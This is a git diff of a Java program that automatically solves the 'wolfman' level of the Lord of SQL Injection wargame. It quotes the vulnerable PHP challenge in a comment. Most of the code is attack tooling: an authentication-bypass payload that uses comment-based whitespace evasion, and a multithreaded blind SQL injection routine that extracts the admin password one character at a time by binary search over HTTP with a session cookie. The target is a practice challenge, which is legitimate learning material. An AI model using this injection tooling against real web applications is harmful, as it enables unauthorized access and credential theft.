@@ -2,26 +2,26 @@ import java.io.*;
 import java.util.*;
 import java.net.*;
 /**
-* solving los problem example
-* @author imscs21
-* @url https://github.com/imscs21/los
-* 
-*/
+ * solving los problem example
+ * @author imscs21
+ * @url https://github.com/imscs21/los
+ * 
+ */
 /*  ====P-R-O-B-L-E-M====
  * 
  * <?php 
-  include "./config.php"; 
-  login_chk(); 
-  dbconnect(); 
-  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
-  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
-  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
-  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
-  $result = @mysql_fetch_array(mysql_query($query)); 
-  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
-  if($result['id'] == 'admin') solve("wolfman"); 
-  highlight_file(__FILE__); 
-?>
+ include "./config.php"; 
+ login_chk(); 
+ dbconnect(); 
+ if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+ if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
+ $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
+ echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+ $result = @mysql_fetch_array(mysql_query($query)); 
+ if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+ if($result['id'] == 'admin') solve("wolfman"); 
+ highlight_file(__FILE__); 
+ ?>
  * 
  */
 
@@ -59,6 +59,38 @@ implements Runnable
 		conn=null;
 		return content;
 	}
+	public static boolean solveNow(Configure conf,String fullanswer,boolean pwVarOnly) throws Exception{
+		Scanner sc = new Scanner(System.in);
+		System.out.print("would you want to clear this level on this program?[y/n] ");
+String content;
+		final String resp = sc.next();
+		final String fnt = pwVarOnly?"pw=%s":"%s";
+		if(resp.equals("y")||resp.equals("Y")){
+
+			System.out.println("applying...");
+			String sub_query = "?"+String.format(fnt,fullanswer);
+			content=queryContent(conf,sub_query);
+
+			if(isSuccessAndIsClear(content)){
+				System.out.println("Stage Clear!");
+				return true;
+			}else{
+				sub_query = "?"+String.format(fnt,URLEncoder.encode( fullanswer));
+				content=queryContent(conf,sub_query);
+
+				if(isSuccessAndIsClear(content)){
+					System.out.println("Stage Clear!");
+					return true;
+				}else{//tested on only mac (java ver 1.8.91) and windows NT isn`t seemed to be compatible on encoding(windows java ver 1.8.111 - x86) with string variable
+					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
+				
+					}
+					return false;
+			}
+		}
+		return false;
+	}
+	
 	public static boolean isSuccess(String resp,String[] acclst){
 		boolean rst = false;
 		for(String acc:acclst){
@@ -93,51 +125,31 @@ implements Runnable
 		}
 
 		try{
-	    String dt = "'/**/or/**/id='admin'#";
-			Scanner sc = new Scanner(System.in);
-			System.out.print("would you want to clear this level on this program?[y/n] ");
-			
-			final String resp = sc.next();
-			if(resp.equals("y")||resp.equals("Y")){
-				
-				System.out.println("applying...");
-								String sub_query = "?"+String.format("pw=%s",dt);
-				content=queryContent(conf,sub_query);
-				
-				if(isSuccessAndIsClear(content)){
-				System.out.println("Stage Clear!");
-				}else{
-					 sub_query = "?"+String.format("pw=%s",URLEncoder.encode( dt));
-				content=queryContent(conf,sub_query);
-				
-				if(isSuccessAndIsClear(content)){
-					System.out.println("Stage Clear!");
-				}else{//tested on only mac (java ver 1.8.91) and windows NT isn`t seemed to be compatible on encoding(windows java ver 1.8.111 - x86) with string variable
-					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
-				}
-				}
-			}
-			
+			String dt = "'/**/or/**/id='admin'#";
+			//String content;
+			System.out.println("pass");
+			solveNow(conf,dt,true);
+
 		}catch(Exception e){
 			e.printStackTrace(System.out);
 		}
 	}
-protected class SearchThread extends Thread{
-	protected Configure conf;
-	protected char[] aa;
-	protected int i;
-	private String content;
-	public SearchThread(int i,char[] aa,Configure conf){
-		this.aa=aa;
-		this.conf=conf;
-		this.i = i;
-	}
-@Override
-public void run(){
-	try{
-					 int maxv = 1;
-				 final String query_format = "pw='%%20or%%20conv(hex(substr(pw,%d,1)),%%2016,%%2010)%s%d%%20%s";
-					while(true){
+	protected class SearchThread extends Thread{
+		protected Configure conf;
+		protected char[] aa;
+		protected int i;
+		private String content;
+		public SearchThread(int i,char[] aa,Configure conf){
+			this.aa=aa;
+			this.conf=conf;
+			this.i = i;
+		}
+		@Override
+		public void run(){
+			try{
+				int maxv = 1;
+				final String query_format = "pw='%%20or%%20conv(hex(substr(pw,%d,1)),%%2016,%%2010)%s%d%%20%s";
+				while(true){
 					String sub_query = "?"+String.format(query_format,i+1,"%3E",maxv,URLEncoder.encode(" and id='admin"));
 					content = queryContent(conf,sub_query);
 					if(isSuccess(content)){
@@ -146,51 +158,52 @@ public void run(){
 					else{
 						break;
 					}}
-					int minv = maxv/2;
-					//System.out.printf("range(%d, %d)\n",minv,maxv);
-					int minrange = minv;
-					int maxrange = maxv;
-					//for(int j=minv;j<=maxv;j++){
-					boolean isFound = true;
-					
-					int j=0;
-					while( 0<minrange&&minrange<=maxrange){
-						
-						 j = (minrange+maxrange)/2;
-						String sub_query = "?"+String.format(query_format,i+1,"<",j,URLEncoder.encode(" and id='admin"));
-						content = queryContent(conf,sub_query);
-						if((isFound=isSuccess(content))){
-							maxrange=j;
+				int minv = maxv/2;
+				//System.out.printf("range(%d, %d)\n",minv,maxv);
+				int minrange = minv;
+				int maxrange = maxv;
+				//for(int j=minv;j<=maxv;j++){
+				boolean isFound = true;
+
+				int j=0;
+				while( 0<minrange&&minrange<=maxrange){
+
+					j = (minrange+maxrange)/2;
+					String sub_query = "?"+String.format(query_format,i+1,"<",j,URLEncoder.encode(" and id='admin"));
+					content = queryContent(conf,sub_query);
+					if((isFound=isSuccess(content))){
+						maxrange=j;
+					}
+					else{
+						if(minrange!=j){
+							minrange=j;
 						}
 						else{
-							if(minrange!=j){
-							minrange=j;
-							}
-							else{
-								aa[i]=(char)minrange;
-								break;
-							}
+							aa[i]=(char)minrange;
+							break;
 						}
-						
 					}
-	}catch(Exception e){e.printStackTrace(System.out);}
-			 
-}
-	
-}
+
+				}
+			}catch(Exception e){e.printStackTrace(System.out);}
+
+		}
+
+	}
 	public static void main(String... args){
 		try{
-		Runnable bi = (Runnable) Class.forName(Thread.currentThread().getStackTrace()[1].getClassName()).newInstance(); // new Xavis();//getClass().newInstance();
-		System.out.println( Thread.currentThread().getStackTrace()[1].getClassName());
-		Thread th = new Thread(bi);
-		th.start();
-		try{
-			th.join();}catch(Exception e2){}
+			int idx = 2;//adjust for your java environment
+			Runnable bi = (Runnable) Class.forName(Thread.currentThread().getStackTrace()[idx].getClassName()).newInstance(); // new Xavis();//getClass().newInstance();
+			System.out.println( Thread.currentThread().getStackTrace()[idx].getClassName());
+			Thread th = new Thread(bi);
+			th.start();
+			try{
+				th.join();}catch(Exception e2){}
 		}catch(Exception e){}
-		
+
 		System.out.println("program finish");
 	}
-protected static class Configure{
+	protected static class Configure{
 		protected String token="",mUrl="";
 		public String setToken(String tk){
 			token=tk;
@@ -205,7 +218,7 @@ protected static class Configure{
 		}
 		public String getToken(){
 			return token;
-		
+
 		}
 		public String getCookieContent(){
 			return  "PHPSESSID="+getToken()+";";
@@ -220,7 +233,7 @@ protected static class Configure{
 			System.out.print("input url: ");
 			setURL(sc.next());
 			System.out.println();
-            
+
 		}
 	}
 }
